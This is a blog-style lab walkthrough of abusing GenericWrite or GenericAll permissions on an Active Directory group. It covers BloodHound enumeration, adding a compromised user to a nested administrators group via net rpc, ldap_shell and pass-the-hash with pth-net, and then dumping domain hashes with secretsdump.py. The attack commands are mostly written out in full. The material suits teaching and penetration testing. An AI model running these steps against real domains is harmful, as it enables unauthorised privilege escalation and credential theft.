---
title: "DACL Abusing GenericWrite on AD Group Objects"
date: 2025-08-05
categories: [Acive Directory, DACL, Access Control Entries, Privilege Escalation, Lateral Movement]
tags: [Acive Directory, Privilege Escalation, DACL, GenericWrite, GenericAll, WriteProperty, Validated-SPN, msDS-KeyCredentialLink, ShadowCredentials, Kerberoasting, AddMember]
---

## Acknowledgements and Resources

This is by no means a **new technique**. In fact, it is **widely known** and **frequently used** in offensive security. I chose to write about it to help fill any **practical gaps** for those who may understand the **theory** but struggle with **real world exploitation**. My aim is to show you how to **identify** the **misconfiguration** and demonstrate **multiple methods** to **exploit** it effectively. During my research, [**thehacker.recipes**](https://thehacker.recipes/){:target="_blank" rel="noopener noreferrer"} proved to be an **incredibly useful resource**. If you have not visited it yet, I **highly recommend** doing so.


## About
Access in **Active Directory** is controlled using **Access Control Entries (ACEs)**, which define allowed or denied permissions for **users** or **computers** on specific objects like **users**, **groups**, or **OUs**. These **ACEs** form part of **Discretionary Access Control Lists (DACLs)**, which manage **permissions**, while **System Access Control Lists (SACLs)** handle **auditing**. Misconfigured **ACEs** can be exploited for **lateral movement** or **privilege escalation** within a **domain**.

The following attacks should be **considered** when the controlled object has any of the following **ACLs** over a target group object:

- **GenericAll**
- **GenericWrite**
- **Self**
- **AllExtendedRights**
- **Self-Membership**

## Set up ACL Misconfiguration in Lab

To apply the **misconfigured permissions**, open **PowerShell as Administrator** on the **Domain Controller (DC)** and run the commands below. **Amend accordingly** to your target domain information.

**Note:** In my lab, I have not set up a dedicated **Groups OU**, therefore, if there is no dedicated **OU** specified when creating groups, **Active Directory (AD)** will place the group in the default **Users container**.

**Set owned user with GenericWrite on target group:**
```bash
dsacls "CN=TestingNestingAdministratorsGroup,CN=Users,DC=north,DC=sevenkingdoms,DC=local" /G north\jaremy.rykker:GW
```
**Set owned user with GenericAll on target group:**
```bash
dsacls "CN=TestingNestingAdministratorsGroup,CN=Users,DC=north,DC=sevenkingdoms,DC=local" /G north\jaremy.rykker:GA
```
**Remove all Access Control Entries (ACE) for owned user on target group**
The below command will remove any ACEs for **jaremy.rykker** on **TestingNestingAdministratorsGroup** group.
```bash
dsacls "CN=TestingNestingAdministratorsGroup,CN=Users,DC=north,DC=sevenkingdoms,DC=local" /R north\jaremy.rykker
```

## Scenario

In this scenario, we have compromised a low privileged user, **jaremy.rykker**, who has `GenericWrite` or `GenericAll`permissions over a privileged group object, **TestingNestingAdministratorsGroup**. Although **jaremy.rykker** is a standard user, this permission allows us to modify certain attributes on **TestingNestingAdministratorsGroup**, such as its membership. Since **TestingNestingAdministratorsGroup** is already a member of the built-in **Administrators** group, adding **jaremy.rykker** as a member of this nested group results in immediate privilege escalation. This works because `GenericWrite` grants control over the group object, including its membership, allowing us to insert our low privileged user into a highly privileged path.

## Dump Active Directory with Bloodhound.py

**ACL Relationships Only**
```bash
python3 bloodhound.py -u jaremy.rykker -p 'Winter123!' -d north.sevenkingdoms.local -c ACL -dc winterfell --zip
```
**Dump Everything**
```bash
python3 bloodhound.py -u jaremy.rykker -p 'Winter123!' -d north.sevenkingdoms.local -c All -dc winterfell --zip
```

## Enumerating GenericWrite/GenericAll From Compromised User in BloodHound

In **BloodHound**, we search for the name of our **compromised account**. Once found, we click on the **user** and view the **Node Info** to get a wealth of information about our user. We scroll down to **Outbound Object Control**. The **Outbound Object Control Set** will show the number of objects that the current object **can control** via **ACL-based permissions**, if any.

In the image below, we can see that **jaremy.rykker** has a single **Outbound Object Control Set**. When clicking on the entry within BloodHound, we can see that **jaremy.rykker** has **GenericWrite** permissions on **TestingNestingAdministratorsGroup**.
![BH-dacl-gw-on-group](assets/images/dacl-gw-on-group/DACLS-genericwrite2-on-group.png)

Another view to see any **attack paths** from the user **jaremy.rykker** is to click on **Reachable High Value Targets**, if any, from the **Node Info**. This presents a **graph** outlining the **attack path** and indicates that the path uses **GenericWrite** from **jaremy.rykker** to **TestingNestingAdministratorsGroup**, which is already a member of the built-in **Administrators** group.

The image below shows the **attack path** being laid out by **BloodHound** when selecting **Reachable High Value Targets**.
![BH-dacl-gw-on-group](assets/images/dacl-gw-on-group/genericwrite-group-reachable-high-value-targets.png)

If we take a look at the **TestingNestingAdministratorsGroup** membership, we can see that it is a member of the **Administrators** group.
![BH-dacl-gw-on-group](assets/images/dacl-gw-on-group/TestingNestingGroupMembership.png)

## Exploiting GenericWrite on Group Add User to Group

Now that we have established that our **compromised user** has `GenericWrite` over the **TestingNestingAdministratorsGroup** group, we are free to add our compromised user **jaremy.rykker** to the **TestingNestingAdministratorsGroup** group.

There are **multiple methods** to achieve this. We will explore **three separate methods**. All three approaches will focus on adding the user to a group from a **non-domain joined system**, as **CMD/PowerShell access is not always guaranteed**, even with **compromised credentials**.

## Method 1 - Add Member on Linux Using Net Utility

The **net** utility is commonly used for administering **Samba** and **CIFS/SMB** clients. In this context, we can leverage it to **add our user to the target group**, taking advantage of the misconfigured permissions.

The image below shows an **ldapsearch** query used to list the current **memberships** of the target group **TestingNestingAdministratorsGroup**. As seen in the output, the **group membership is currently empty**
![dacl-group-query](assets/images/dacl-gw-on-group/dacls-gw-group-checking-group-membership-empty.png)

**Net Rpc Command:**
```bash
net rpc group addmem "Target_Group_Name_To_Add_Account" Target_Compromised_Account -U FQDN/username%'Password' -S DomainControlelr_HostName_or_IP_address
```
The below image shows the successful execution of the **net** utility, which adds the user **jaremy.rykker** to the group **TestingNestingAdministratorsGroup**. If the command is successful, you will not receive any output. 
![dacl-group-net-util](assets/images/dacl-gw-on-group/dacls-gw-group-net-utility.png)

Querying the **group membership** as we did before using **ldapsearch** now shows that our user **jaremy.rykker** is a **member** of the **TestingNestingAdministratorsGroup**. See image below.

**Ldapsearch Query:**
```bash
ldapsearch -x -H ldap://192.168.1.154 -D 'jaremy.rykker@north.sevenkingdoms.local' -w 'Winter123!' -b "DC=north,DC=sevenkingdoms,DC=LOCAL" "(sAMAccountName=TestingNestingAdministratorsGroup)" member 
```
![dacl-group-query](assets/images/dacl-gw-on-group/dacls-gw-group-checking-group-membership-has-member.png)


## Method 2 - Add Group Member Using Ldap_shell

**Ldap_shell** is a **fork of Impacket** that provides an **interactive shell** for **Active Directory enumeration** and **manipulation** via **LDAP/LDAPS protocols**.

**Ldap_Shell Github:**
* https://github.com/PShlyundin/ldap_shell

### Authenticate to DC Using Ldap_shell

Run **ldap_shell** and **authenticate** to the domain controller.
```bash
ldap_shell 'domain/CompromisedUserName:Password' -dc-ip DC_IP
```
![dacl-ldapshell](assets/images/dacl-gw-on-group/dacl-ldap_shell1.png)

### Add User to Group Using Ldap_shell

Run the **add_user_to_group** command with the appropriate parameters. 
```bash
add_user_to_group user targetgroup
```
![dacl-ldapshell](assets/images/dacl-gw-on-group/dacl-ldap_shell2.png)

### Verify Group Membership Using Ldap_shell

We can **verify** our user is now a **group member** by using the ldap_shell **get_group_users** command.

**List Group Memberships Using Ldap_shell Command**
```bash
get_group_users TestingNestingAdministratorsGroup
```

![dacl-ldapshell](assets/images/dacl-gw-on-group/dacl-ldap_shell3.png)

## Method 3 - Passing-the-Hash

We can use the tool **passing-the-hash (pth)** to add the user to the target group.

In order to use **pth**, we obviously need a **hash**. Since we have a **compromised user**, we likely already know the **password**. We can generate an **NT hash** using a simple **Python one-liner**. This involves including a **padding value** (usually `aad3b435b51404eeaad3b435b51404ee`) for the **LM hash**, and the actual **NT hash** in the second part.

### Python One-liner to Create NT Hash:
```python
python3 -c "import hashlib; pwd='ThePassword'; print(f'00000000000000000000000000000000:{hashlib.new(\"md4\", pwd.encode(\"utf-16le\")).hexdigest()}')"
```
![dacl-pth](assets/images/dacl-gw-on-group/dacl-pth-1.png)

### Add User to Group with Pth-Net

Now that we have a **NT hash** of the known password, we can use **pth-net** command to add our user to the target group. 

**Pth-net Command:**
```bash
pth-net rpc group addmem TargetGroup UserToAdd -U domain/UserName%00000000000000000000000000000000:NTHash -S DomainController
```
![dacl-pth](assets/images/dacl-gw-on-group/dacl-pth-2.png)

### Verify Group Membership with Ldapsearch

**Ldapsearch Command:**
```bash
ldapsearch -x -H ldap://192.168.1.154 -D 'jaremy.rykker@north.sevenkingdoms.local' -w 'Winter123!' -b "DC=north,DC=sevenkingdoms,DC=LOCAL" "(sAMAccountName=TestingNestingAdministratorsGroup)" member 
```
![dacl-pth](assets/images/dacl-gw-on-group/dacl-pth-3.png)

## Dump Hashes and Lsa Secrets Using Secretsdump.py

Now that our user is a member of a nested administrators group, we can unleash the power of **secretsdump.py** to harvest domain hashes for the power, glory!!

**Secretsdump Command:**
```bash
python3 secretsdump.py north/jaremy.rykker@192.168.1.154
```
![dacl-pth](assets/images/dacl-gw-on-group/dacl-secretsdump.png)

**And that's it! Hopefully, if you were unsure how to approach this attack path, this blog has filled in the gaps. Next time you come across this type of misconfiguration, you’ll know exactly how to own it.**
